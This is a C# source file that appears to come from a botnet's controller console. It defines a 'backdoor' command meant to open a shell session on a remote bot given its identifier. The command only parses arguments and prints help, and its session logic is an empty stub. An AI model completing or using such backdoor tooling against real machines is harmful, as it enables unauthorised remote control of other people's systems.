using System;
using System.Collections.Generic;
using Mono.Options;

namespace Vinchuca.REPL
{
    class BackdoorCommand : Command
    {
        public bool ShowHelp { get; set; }
        public string BotId { get; set; }

        public BackdoorCommand(Agent agent)
            : base("backdoor", "Opens a session with a remote agent to execute commands.")
        {
            Options = new OptionSet() {
            "usage: backdoor --bot:identifier",
            "",
            "Opens a session with a remote agent to execute shell commands.",
            "eg: backdoor --bot:028d9a9a9b76a755f6262409d86c7e05",
            { "bot=",   "{bot} the bot identifier to connect with", x => BotId = x },
            { "help|h|?","Show this message and exit.",
              v => ShowHelp = v != null },
        };
        }


        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (string.IsNullOrEmpty(BotId))
                {
                    Console.Error.WriteLine("commands: Missing required argument `--bot=BOT-IDENTIFIER`.");
                    Console.Error.WriteLine("commands: Use `help backdoor` for details.");
                    return 1;
                }
                ///
                return 0;
            }
            catch (Exception e)
            {
//                Console.Error.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }
}
